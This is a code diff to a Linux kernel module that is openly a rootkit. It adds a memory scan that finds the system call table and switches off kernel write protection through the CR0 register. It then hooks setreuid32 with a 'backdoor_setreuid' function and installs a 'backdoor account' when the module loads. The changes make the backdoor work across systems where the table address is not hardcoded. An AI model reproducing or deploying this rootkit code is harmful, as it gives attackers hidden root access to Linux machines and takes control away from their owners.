@@ -25,7 +25,7 @@ typedef unsigned long psize;
 asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
 // "table" will be replaced with the system call table address found by grep in compile.sh
-psize *sys_call_table = (psize*)0xTABLE;
+psize *sys_call_table;
 
 asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);
 
@@ -44,6 +44,21 @@ asmlinkage long backdoor_setreuid(uid_t r, uid_t e) {
 	}
 
 
+}
+
+psize **find(void) {
+
+	psize **sctable;
+	psize i = START_CHECK;
+
+	while (i < END_CHECK) {
+
+		sctable = (psize **) i;
+		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
+		i += sizeof(void *);
+	}
+
+	return NULL;
 }
 
 // backdoor account
@@ -254,14 +269,14 @@ void remove_backdoor(void) {
 void add_setreuid(void) {
 
 	write_cr0(read_cr0() & (~ 0x10000));
-	o_setreuid = (void*) xchg(&sys_call_table[__NR_setreuid], backdoor_setreuid);
+	o_setreuid = (void*) xchg(&sys_call_table[__NR_setreuid32], backdoor_setreuid);
 	write_cr0(read_cr0() | 0x10000);
 }
 
 void remove_setreuid(void) {
 
 	write_cr0(read_cr0() & (~ 0x10000));
-	xchg(&sys_call_table[__NR_setreuid], o_setreuid);
+	xchg(&sys_call_table[__NR_setreuid32], o_setreuid);
 	write_cr0(read_cr0() | 0x10000);
 }
 
@@ -269,8 +284,12 @@ void remove_setreuid(void) {
 // ==========================
 
 int init_module(void) {
-    	
-	printk("sys_call_table found at %p\n", sys_call_table);
+    if((sys_call_table = (psize *) find())) {
+		printk("sys_call_table found at %p\n", sys_call_table);
+	} else {
+		printk(KERN_ERR "syscall table not found; aborting\n");
+		return 1;
+	}
 
 	add_backdoor();
 	add_setreuid();
